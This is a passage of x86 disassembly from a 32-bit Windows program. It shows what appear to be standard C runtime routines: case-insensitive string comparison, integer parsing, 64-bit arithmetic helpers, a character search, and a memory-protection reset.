  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
